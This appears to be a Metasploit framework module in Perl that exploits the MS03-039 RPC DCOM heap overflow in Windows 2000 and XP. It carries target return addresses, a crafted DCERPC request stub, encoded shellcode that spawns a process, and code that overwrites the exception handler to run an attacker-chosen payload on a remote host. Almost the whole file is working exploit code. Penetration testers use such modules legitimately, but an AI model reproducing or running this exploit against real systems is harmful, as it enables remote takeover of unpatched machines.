package Msf::Exploit::msrpc_dcom_ms03_039;
use base "Msf::Exploit";
use Pex::DCERPC;
use strict;

my $advanced = { };

my $info =
{
    'Name'  => 'Microsoft RPC DCOM MSO3-039',
     'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]' ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 1,
    'AutoOpts'  => { 'EXITFUNC' => 'thread' },
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 135],
                },

    'Payload' => {
                    'Space'  => 472,
                    'BadChars'  => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
                 },
    
    'Description'  => qq{
        This module exploits a heap overflow in the RPCSS service.
    },
                
    'Refs'  =>   [  
                    #'http://www.osvdb.org/2100',
                    'http://www.microsoft.com/technet/security/bulletin/MS03-039.mspx'
                 ],
    'DefaultTarget' => 4,
    'Targets' => [
                    ["Windows 2000 SP0", 0x77ee044c],
                    ["Windows 2000 SP1", 0x77edf44c],    
                    ["Windows 2000 SP2", 0x77edf44c],
                    ["Windows 2000 SP3", 0x77eda1f0],
                    ["Windows 2000 SP4", 0x7c54144c],
                    ["Windows XP SP0",   0x77ed63b4],
                    ["Windows XP SP1",   0x77ed73b4],
                 ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
    
    my $tlseh = $self->Targets->[$target_idx]->[1];
    my ($res, $rpc);

    my $s = Msf::Socket->new();
    if (! $s->Tcp($target_host, $target_port))
    {
        $self->PrintLine("");
        $self->PrintLine("[*] Error: " . $s->GetError());
        return(0);
    }

    my $bind = Pex::DCERPC::Bind(Pex::DCERPC::UUID('SYSACT'), '0.0', Pex::DCERPC::DCEXFERSYNTAX(), '2');
    $s->Send($bind);
    $res = $s->Recv(60, 5);
    $rpc = Pex::DCERPC::DecodeResponse($res);
    
    if ($rpc->{'AckResult'} != 0) {
        $self->PrintLine("[*] Could not bind to SYSACT interface");
        return(0);
    }

    $self->PrintLine("[*] Connected to SYSACT with group ID 0x".sprintf("%x", $rpc->{'AssocGroup'}));

    
    my $stub =
    "\x05\x00\x06\x00\x01\x00\x00\x00\x00\x00\x00\x00\x32\x24\x58\xfd".
    "\xcc\x45\x64\x49\xb0\x70\xdd\xae\x74\x2c\x96\xd2\x60\x5e\x0d\x00".
    "\x01\x00\x00\x00\x00\x00\x00\x00\x70\x5e\x0d\x00\x02\x00\x00\x00".
    "\x7c\x5e\x0d\x00\x00\x00\x00\x00\x10\x00\x00\x00\x80\x96\xf1\xf1".
    "\x2a\x4d\xce\x11\xa6\x6a\x00\x20\xaf\x6e\x72\xf4\x0c\x00\x00\x00".
    "\x4d\x41\x52\x42\x01\x00\x00\x00\x00\x00\x00\x00\x0d\xf0\xad\xba".
    "\x00\x00\x00\x00\xa8\xf4\x0b\x00\x60\x03\x00\x00\x60\x03\x00\x00".
    "\x4d\x45\x4f\x57\x04\x00\x00\x00\xa2\x01\x00\x00\x00\x00\x00\x00".
    "\xc0\x00\x00\x00\x00\x00\x00\x46\x38\x03\x00\x00\x00\x00\x00\x00".
    "\xc0\x00\x00\x00\x00\x00\x00\x46\x00\x00\x00\x00\x30\x03\x00\x00".
    "\x28\x03\x00\x00\x00\x00\x00\x00\x01\x10\x08\x00\xcc\xcc\xcc\xcc".
    "\xc8\x00\x00\x00\x4d\x45\x4f\x57\x28\x03\x00\x00\xd8\x00\x00\x00".
    "\x00\x00\x00\x00\x02\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc4\x28\xcd\x00".
    "\x64\x29\xcd\x00\x00\x00\x00\x00\x07\x00\x00\x00\xb9\x01\x00\x00".
    "\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46\xab\x01\x00\x00".
    "\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46\xa5\x01\x00\x00".
    "\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46\xa6\x01\x00\x00".
    "\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46\xa4\x01\x00\x00".
    "\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46\xad\x01\x00\x00".
    "\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46\xaa\x01\x00\x00".
    "\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46\x07\x00\x00\x00".
    "\x60\x00\x00\x00\x58\x00\x00\x00\x90\x00\x00\x00\x40\x00\x00\x00".
    "\x20\x00\x00\x00\x78\x00\x00\x00\x30\x00\x00\x00\x01\x00\x00\x00".
    "\x01\x10\x08\x00\xcc\xcc\xcc\xcc\x50\x00\x00\x00\x4f\xb6\x88\x20".
    "\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x01\x10\x08\x00\xcc\xcc\xcc\xcc\x48\x00\x00\x00\x07\x00\x66\x00".
    "\x06\x09\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46".
    "\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00".
    "\x00\x00\x00\x00\x78\x19\x0c\x00\x58\x00\x00\x00\x05\x00\x06\x00".
    "\x01\x00\x00\x00\x70\xd8\x98\x93\x98\x4f\xd2\x11\xa9\x3d\xbe\x57".
    "\xb2\x00\x00\x00\x32\x00\x31\x00\x01\x10\x08\x00\xcc\xcc\xcc\xcc".
    "\x80\x00\x00\x00\x0d\xf0\xad\xba\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x18\x43\x14\x00\x00\x00\x00\x00".
    "\x60\x00\x00\x00\x60\x00\x00\x00\x4d\x45\x4f\x57\x04\x00\x00\x00".
    "\xc0\x01\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46".
    "\x3b\x03\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46".
    "\x00\x00\x00\x00\x30\x00\x00\x00\x01\x00\x01\x00\x81\xc5\x17\x03".
    "\x80\x0e\xe9\x4a\x99\x99\xf1\x8a\x50\x6f\x7a\x85\x02\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x01\x00\x00\x00\x01\x10\x08\x00\xcc\xcc\xcc\xcc".
    "\x30\x00\x00\x00\x78\x00\x6e\x00\x00\x00\x00\x00\xd8\xda\x0d\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x20\x2f\x0c\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00".
    "\x46\x00\x58\x00\x00\x00\x00\x00\x01\x10\x08\x00\xcc\xcc\xcc\xcc".
    "\x10\x00\x00\x00\x30\x00\x2e\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x08\x00\xcc\xcc\xcc\xcc".
    "\x68\x00\x00\x00\x0e\x00\xff\xff\x68\x8b\x0b\x00\x02\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00";

    my $endpath =
    "\x46\x00\x43\x00\x24\x00\x46\x00\x31\x00\x32\x00\x33\x00\x34\x00".
    "\x35\x00\x36\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00".
    "\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00".
    "\x31\x00\x2E\x00\x64\x00\x6F\x00\x63\x00\x00\x00".
    "\x01\x10\x08\x00\xcc\xcc\xcc\xcc\x20\x00\x00\x00\x30\x00\x2d\x00".
    "\x00\x00\x00\x00\x88\x2a\x0c\x00\x02\x00\x00\x00\x01\x00\x00\x00".
    "\x28\x8c\x0c\x00\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00";
    
    
    my $uncpath =
        "\x6C\x00\x6F\x00\x63\x00\x61\x00\x6C\x00\x68\x00\x6F\x00\x73\x00".
        "\x74\x00\x5C\x00\x43\x00\x24\x00\x5C\x00";

    $uncpath .= ("\xcc" x (1036-length($uncpath)));
 
 
    # fix the heap so the following CreateProcessA does not die
    my $heapfix =
    "";
 
 
    # spawn following 1024 bytes as forked process
    my $jfork =
    "\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x59\x81\x73\x17\x03\x10".
    "\x03\x03\x83\xeb\xfc\xe2\xf4\x82\xfc\x03\x07\x03\x10\x8a\xe6\xe8".
    "\x7b\x55\x69\x33\x49\x67\x88\x02\x9b\x43\x0f\x88\x60\x1f\xae\x88".
    "\x50\x0b\x5d\xc0\x70\x88\x6f\x27\x34\x88\x46\x3f\x9b\x57\x06\x7b".
    "\x11\xe9\x88\x49\x08\x88\x59\x23\x11\xe8\xe0\x37\x59\x88\x37\x88".
    "\x11\xed\x32\xfc\x21\xc3\xff\xaf\x94\xc3\x77\x04\xd1\xcc\x0e\x02".
    "\xd7\xe8\xf7\x38\x6c\x27\x2b\x76\xf1\x88\x59\x27\x11\xe8\x65\x88".
    "\x1c\x48\x88\x59\x0c\x02\xe8\x88\x14\x88\x02\xeb\x99\x47\x27\x1f".
    "\x71\xc0\x59\x65\x91\xc1\xc8\x03\x99\xd4\xe8\x1c\xf8\xf2\xfc\xfc".
    "\xef\xfd\xca\xfc\x24\x8c\x50\xeb\x88\xfc\xfc\xfc\x99\x47\x8e\x03".
    "\x99\xe3\x07\x0b\x99\xc7\x3b\xd2\x65\xe4\xc0\xeb\x61\xfc\xfc\xfc".
    "\x99\xc0\x32\xca\x21\xd1\x83\xc2\x17\xeb\xd0\xfc\xef\xfc\xc4\x46".
    "\x30\x60\x6e\x67\x10\x80\xc4\x1f\x99\xfd\xff\x32\xd9\x65\xba\x23".
    "\x13\x8e\x7e\x33\x21\xc3\xf0\xa9\x21\xc3\x32\xd8\x9d\x4e\x33\x52".
    "\x9d\x4e\x77\x52\x40\x53\x83\xc0\x14\x50\x53\x53\x40\x8e\x5e\x23".
    "\x43\x53\xfc\x56\x10\xc4\x86\x87\x10\x03\x03\x04\x10\x02\x03\x8e".
    "\x95\x87\x03\x03\x10\x53\xfc\x76\x24\xfc\x56\x07\x21\xc3\x69\x43".
    "\x78\x03\x13\x03\x10\x6b\x03\x03\x11\x03\x53\xfc\x65\x33\xfc\x56".
    "\x18\x8a\xc4\x32\xcb\x50\x6b\x03\x14\x03\x03\x55\x47\xfc\x76\x33".
    "\xef\x56\x0f\xc4\x95\x87\x03\x03\x10\x04\x03\x02\x10\x8a\xbe\x3f".
    "\x11\x03\x03\x8e\x95\x87\x03\x03\x10\x53\xfc\x76\x24\xfc\x56\x13".
    "\xef\x76\x37\xfc\x45\x17\x32\xc3\x40\xfc\x56\x1b\x62\xfd\xb0\x15".
    "\xc2\xc4\xa4\x6b\x8c\x96\x19\x6d\xb1\x69\x3e\xdb\xc3\xc4\xa4\xeb".
    "\x98\x3c\x49\x9d\x6e\xdb\xe1\x70\x10\x03\x03";    
 
    
    # append the heap fixer to the forker code
    $jfork = $heapfix . $jfork;
    
    # 524 bytes available here
    substr($uncpath,(524-length($jfork)), length($jfork), $jfork);
    
    
    # still in debug mode
    substr($uncpath, 550, 2, "\xcc\xcc");
    
    # jump over the addresses below
    substr($uncpath, 552, 2, "\xeb\x08");
    
    # this doubles as a jmp instruction
    substr($uncpath, 554, 4, pack('V', 0x7ffd1ceb));

    # this is the TL exception handler
    substr($uncpath, 558, 4, pack('V', $tlseh));
    
    # the real payload gets executed here
    substr($uncpath, 562, 472, $shellcode);
    

    my $ps = (length($uncpath) / 2) + 32;

    my $begpath = pack('VVVV', $ps, 0, $ps, 0x005c005c);

    $stub .= $begpath . $uncpath . $endpath;
    foreach my $sz (104, 108, 156, 160, 184, 372) {
        my $old = unpack('V',substr($stub, $sz));
        my $new = $old+length($uncpath)-12;
        substr($stub, $sz, 4, pack('V', $new));
    }

   
    my $exploit = Pex::DCERPC::Request(4, $stub);
    $s->Send($exploit);
    
    $res = $s->Recv(-1, 5);
    $rpc = Pex::DCERPC::DecodeResponse($res);
    if ($rpc && $rpc->{'Type'} eq 'fault') {
        $self->PrintLine("[*] Call to RPC service failed with error ".sprintf("0x%.8x",$rpc->{'Status'}));
        $self->PrintLine("[*] This probably means that the system is patched");
        return(0);
    }
}


